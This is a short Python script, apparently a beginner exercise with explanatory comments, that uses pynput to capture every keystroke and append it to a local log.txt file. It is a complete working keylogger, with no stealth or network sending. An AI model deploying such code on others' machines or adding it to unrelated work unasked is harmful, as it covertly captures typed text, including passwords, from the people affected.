# import pynput module and listner
from pynput.keyboard import Listener


# use with instead of open and close to release memory and terminate
# define variable and switch key data type
# use dot replace to remove ' ' in txt file
def writetofile(key):
    keydata = str(key)
    keydata = keydata.replace("'", "")

    if keydata == 'Key.space':
        keydata = ' '
    if keydata == 'Key.shift_r':
        keydata = ''
    if keydata == 'Key.shift_l':
        keydata = ''
    if keydata == 'Key.backspace':
        keydata = ''
    if keydata == 'Key.enter':
        keydata = '\n'

    with open('log.txt', 'a') as f:
        f.write(keydata)


with Listener(on_press=writetofile) as l:
    l.join()
